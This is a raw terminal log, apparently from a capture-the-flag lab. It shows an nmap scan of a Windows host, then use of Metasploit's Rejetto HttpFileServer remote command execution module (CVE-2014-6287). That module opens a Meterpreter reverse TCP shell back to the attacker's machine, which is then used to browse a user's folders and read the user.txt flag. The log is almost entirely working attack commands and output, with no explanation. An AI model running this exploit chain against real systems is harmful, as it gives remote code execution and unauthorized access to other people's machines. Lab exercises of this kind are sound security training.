``` text
nmap -sV -Pn 10.49.185.165
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-10 10:38 EDT
Nmap scan report for 10.49.185.165
Host is up (0.18s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http          HttpFileServer httpd 2.3
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 342.82 seconds

```

``` text
msfconsole
Metasploit tip: Start commands with a space to avoid saving them to history
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                     
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                   
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                  
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                 
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                 
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                 
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                 
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                 
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                  
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                   
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                    
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                     
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                      
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                        
           :kk;.OOOOOOOOOOOOO.;Ok:                                          
             ;kOOOOOOOOOOOOOOOk:                                            
               ,xOOOOOOOOOOOx,                                              
                 .lOOOOOOOl.                                                
                    ,dOd,                                                   
                      .                                                     

       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

```

```text
search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec                                         

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminatin
                                         g web server
   Proxies                     no        A proxy chain of format type:host
                                         :port[,type:host:port][...]. Supp
                                         orted proxies: sapni, socks4, soc
                                         ks5, http, socks5h
   RHOSTS                      yes       The target host(s), see https://d
                                         ocs.metasploit.com/docs/using-met
                                         asploit/basics/using-metasploit.h
                                         tml
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interfa
                                         ce to listen on. This must be an
                                         address on the local machine or 0
                                         .0.0.0 to listen on all addresses
                                         .
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing co
                                         nnections
   SSLCert                     no        Path to a custom SSL certificate
                                         (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (
                                         default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     192.168.217.130  yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf exploit(windows/http/rejetto_hfs_exec) > set lhost 192.168.175.163
lhost => 192.168.175.163

msf exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.49.180.14
rhosts => 10.49.180.14

msf exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 192.168.175.163:4444 
[*] Using URL: http://192.168.175.163:8080/9sZr7RQr9b
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /9sZr7RQr9b
[*] Sending stage (177734 bytes) to 10.49.180.14
[!] Tried to delete %TEMP%\MafKnXDVOp.vbs, unknown result
[*] Meterpreter session 1 opened (192.168.175.163:4444 -> 10.49.180.14:49240) at 2026-07-10 11:28:10 -0400
[*] Server stopped.
```

```
meterpreter > shell
Process 2216 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\bill
cd C:\Users\bill

C:\Users\bill>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill

09/27/2019  09:09 AM    <DIR>          .
09/27/2019  09:09 AM    <DIR>          ..
09/26/2019  11:29 PM    <DIR>          .groovy
09/27/2019  04:07 AM    <DIR>          Contacts
09/27/2019  09:08 AM    <DIR>          Desktop
09/27/2019  04:07 AM    <DIR>          Documents
09/27/2019  04:07 AM    <DIR>          Downloads
09/27/2019  04:07 AM    <DIR>          Favorites
09/27/2019  04:07 AM    <DIR>          Links
09/27/2019  04:07 AM    <DIR>          Music
09/27/2019  04:07 AM    <DIR>          Pictures
09/27/2019  04:07 AM    <DIR>          Saved Games
09/27/2019  04:07 AM    <DIR>          Searches
09/27/2019  04:07 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  44,214,325,248 bytes free

C:\Users\bill>cd Desktop   
cd Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,214,321,152 bytes free

C:\Users\bill\Desktop>more user.txt
more user.txt
b04763b6fcf51fcd7c13abc7db4fd365

```
